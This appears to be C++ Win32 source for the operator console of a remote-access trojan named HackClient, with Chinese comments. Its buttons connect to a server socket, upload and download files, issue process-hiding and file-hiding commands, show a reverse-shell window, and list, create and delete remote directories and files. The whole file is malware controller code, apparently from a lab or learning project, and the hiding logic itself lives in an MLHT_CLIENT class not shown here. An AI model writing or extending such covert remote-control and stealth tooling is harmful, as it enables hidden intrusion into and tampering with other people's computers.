#include"HACK_CLIENT.h"
//#include <windows.h>
#include<Shlobj.h>
#include<string.h>
//#pragma comment(lib,"Shlobj.lib")
#pragma warning( disable : 4091 )
void HackClient::Init(HWND hwnd){

	int button_x = BUTTON_X;
	int button_y = BUTTON_Y;

	//初始化画面

	//第一列
	hwndbutton[BUTTON_CLIENT_LINK] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_CLIENT_LINK],"连接服务器");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_FILE_UPLOAD] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_FILE_UPLOAD],"上传文件");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_FILE_DOWNLOAD] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,		
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_FILE_DOWNLOAD],"下载文件");

	hwndbutton[BUTTON_SHELL_WINDOW]=CreateWindow("EDIT",NULL,WS_CHILD|WS_BORDER|WS_VISIBLE|ES_LEFT|ES_MULTILINE|ES_READONLY,
		SHELL_X,SHELL_Y,SHELL_WIDTH,SHELL_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),NULL); 
	SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"反弹SHELL显示窗口");

	
	//第二列
	button_x += BUTTON_DISTANCE+BUTTON_WIDTH;
	button_y = BUTTON_Y;

	hwndbutton[BUTTON_PROCESS_HIDE] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_PROCESS_HIDE],"进程隐藏");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_FILE_HIDE] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_FILE_HIDE],"文件隐藏");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_SHELL_INPUT]=CreateWindow("EDIT",NULL,WS_CHILD|WS_BORDER|WS_VISIBLE|ES_LEFT|ES_MULTILINE,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),NULL); 
	SetWindowText(hwndbutton[BUTTON_SHELL_INPUT],"SHELL输入窗口");


	//第三列
	button_x += BUTTON_DISTANCE+BUTTON_WIDTH;
	button_y = BUTTON_Y;

	hwndbutton[BUTTON_SHELL_LS] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_LS],"LS");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_SHELL_MKDIR] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_MKDIR],"MKDIR");

	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_SHELL_RMDIR] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_RMDIR],"RMDIR");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	/*hwndbutton[BUTTON_SHELL_RM] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_RM],"RM");*/

    MoveWindow(hwnd,SCREEN_X,SCREEN_Y,SCREEN_WIDTH,SCREEN_HEIGHT,TRUE);

}


void HackClient::ScreenPaint(HWND hwnd){        //绘制桌面背景
	
	PAINTSTRUCT ps;
	HDC hdc= BeginPaint(hwnd, &ps);
	HDC hdcMem = CreateCompatibleDC(hdc);  
	const char* lpszName = "rc2.bmp";
	HBITMAP hBitmap = (HBITMAP)::LoadImage(
		NULL,
		lpszName,
		IMAGE_BITMAP,
		0,
		0,
		LR_LOADFROMFILE);
    BITMAP bm;
    SelectObject(hdcMem,hBitmap);
    GetObject(hBitmap, sizeof(bm), &bm);
    BitBlt(hdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
    DeleteDC(hdcMem);
    EndPaint(hwnd, &ps);

}


void HackClient::CommandExecute(HWND hwnd,int dir){ 
	switch(dir)
	{
	case BUTTON_CLIENT_LINK:
		//初始化socket
		mc = new MLHT_CLIENT("127.0.0.1",9000);
		//mc = new MLHT_CLIENT("1.1.1.4",9000);
		//连接socket服务端
		if(mc->ConnectServer())
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"LINK SERVER SUCCESSFUL.");
		else
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"LINK SERVER FAIL.");
		break;
	case BUTTON_FILE_UPLOAD:
		{
			TCHAR str[MAX_PATH] = {0};

			TCHAR uploadFilename[MAX_PATH] = {0};
			OPENFILENAME ofn= {0};
			ofn.lStructSize = sizeof(ofn);
			ofn.hwndOwner = hwnd;
			//ofn.lpstrFilter = "Exe文件(*.exe)\0*.exe\0所有文件(*.*)\0*.*\0";//要选择的文件后缀
			ofn.lpstrFilter = 
				"所有文件(*.*)";//要选择的文件后缀
			ofn.lpstrInitialDir = "c:\\users";//默认的文件路径
			ofn.lpstrFile = uploadFilename;//存放文件的缓冲区
			ofn.nMaxFile = sizeof(uploadFilename)/sizeof(*uploadFilename);
			ofn.nFilterIndex = 0;
			ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_EXPLORER ;//标志如果是多选要加上OFN_ALLOWMULTISELECT

			if(GetOpenFileName(&ofn)){
				//if(mc->UpLoadFile(uploadFilename,GetFilename(uploadFilename))==PACKET_ACCEPT_SUCCESS){
				if(mc->UpLoadFile(uploadFilename,"d:\\hideme\\test.txt")==PACKET_ACCEPT_SUCCESS){
					wsprintf(str,"上传文件路径：%s",uploadFilename);
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"上传失败");
			}

		}
		break;
	case BUTTON_FILE_DOWNLOAD:
		{
			TCHAR str[MAX_PATH] = {0};

			TCHAR downloadFilename[MAX_PATH] = "d:\\hideme\\test.txt";

			TCHAR downloadFileDir[MAX_PATH] = {0};
			BROWSEINFO bi;
			ZeroMemory(&bi,sizeof(BROWSEINFO)); 
			bi.hwndOwner = NULL; 
			bi.pszDisplayName = downloadFileDir; 
			bi.lpszTitle = "从下面选择将下载到文件的文件夹:"; 
			bi.ulFlags = BIF_RETURNFSANCESTORS;
			LPITEMIDLIST idl = SHBrowseForFolder(&bi); 
			if (idl != NULL)
			{ 
				//选择将下载到文件的文件夹
				if(SHGetPathFromIDList(idl,downloadFileDir))
				{
					strcat_s(downloadFileDir,"\\");
					strcat_s(downloadFileDir,GetFilename(downloadFilename));
					if(mc->DownLoadFile(downloadFilename,downloadFileDir)==PACKET_ACCEPT_SUCCESS){
						wsprintf(str,"下传文件 %s \r\n至：%s",downloadFilename,downloadFileDir);
						SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
					}
					else
						SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"下载失败");
				}
			}
		}
		break;
	case BUTTON_PROCESS_HIDE:
		if(processhide){
			processhide = false;
			mc->ShowProcess();
			SetWindowText(hwndbutton[BUTTON_PROCESS_HIDE],"进程隐藏");
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"已发出进程显示指令");
		}
		else{
			processhide = true;
			mc->HideProcess();
			SetWindowText(hwndbutton[BUTTON_PROCESS_HIDE],"进程显示");
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"已发出进程隐藏指令");
		}
		break;
	case BUTTON_FILE_HIDE:
		if(filehide){
			filehide = false;
			mc->ShowFile();
			SetWindowText(hwndbutton[BUTTON_FILE_HIDE],"文件隐藏");
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"已发出文件显示指令");
		}
		else{
			filehide = true;
			mc->HideFile();
			SetWindowText(hwndbutton[BUTTON_FILE_HIDE],"文件显示");
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"已发出文件隐藏指令");
		}
		break;
	case BUTTON_SHELL_INPUT:
		{
			TCHAR str[3000] = {0};
			//char a[MAX_PATH]={0};



			TCHAR filedir[MAX_PATH] = "C:\\hideme";
			if(mc->ShellLs(filedir)==PACKET_ACCEPT_SUCCESS){
				//wsprintf(str,"%s文件目录为：\r\n%s",filedir,mc->p_get->GetPacketContent());
				wsprintf(str,"%s",mc->p_get->GetPacketContent());
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
			}
			break;
		}
	case BUTTON_SHELL_LS:
		{
			TCHAR str[3000] = {0};
			//char a[MAX_PATH]={0};



			TCHAR filedir[MAX_PATH] = "C:\\hideme";
			if(mc->ShellLs(filedir)==PACKET_ACCEPT_SUCCESS){
				//wsprintf(str,"%s文件目录为：\r\n%s",filedir,mc->p_get->GetPacketContent());
				wsprintf(str,"%s",mc->p_get->GetPacketContent());
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
			}
			else
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"列目录失败");
		}
		break;
	case BUTTON_SHELL_MKDIR:
		{
			TCHAR str[MAX_PATH] = {0};

			TCHAR filedir[MAX_PATH] = "c:\\hideme\\deleteme";
			if(mc->ShellMkdir(filedir)==PACKET_ACCEPT_SUCCESS){
				wsprintf(str,"已创建文件目录：\r\n%s",filedir);
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
			}
			else
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"创建文件目录失败");
		}
		break;
	case BUTTON_SHELL_RMDIR:
		{
			TCHAR str[10000] = {0};

			TCHAR filedir[MAX_PATH] = "d:\\hideme\\deleteme";
			if(mc->ShellRmdir(filedir)==PACKET_ACCEPT_SUCCESS){
				wsprintf(str,"已删除文件目录：\r\n%s",filedir);
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
			}
			else
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"删除文件目录失败");
		}
		break;
	case BUTTON_SHELL_RM:
		{
			TCHAR str[MAX_PATH] = {0};

			TCHAR filename[MAX_PATH] = "C:\\hideme\\1.txt";
			if(mc->ShellRm(filename)==PACKET_ACCEPT_SUCCESS){
				wsprintf(str,"已删除文件：\r\n%s",filename);
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
			}
			else
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"删除文件失败");
		}
		break;
	default:
		break;
	}
}


char* HackClient::GetFilename(char* FullPathName)	//获取全路径中的文件名
{
	char* pos = FullPathName+strlen(FullPathName);
	while(*pos != '\\'&& pos!=FullPathName)
		pos--;
	if(pos == FullPathName)
		return pos;
	else
		return pos+1;
}